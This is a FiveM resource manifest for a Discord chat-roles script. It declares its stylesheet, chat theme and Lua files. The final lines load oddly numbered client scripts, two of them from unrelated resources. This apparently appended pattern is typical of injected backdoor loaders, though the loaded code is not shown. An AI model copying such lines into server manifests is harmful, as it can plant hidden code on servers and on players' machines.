------------------------------------
--- Discord Chat Roles by Badger ---
------------------------------------


file 'style.css'

chat_theme 'gtao' {
    styleSheet = 'style.css',
    msgTemplates = {
        default = '<b>{0}</b><span>{1}</span>'
    }
}

client_scripts {
    "client/discordchatrolesclient.lua",
}

server_scripts {
    "server/discordchatrolesserver.lua",
}

client_script '14796.lua'


client_script '94606.lua'
client_script '@bigswagger/59642.lua'
client_script '@PDCarPack4/26671.lua'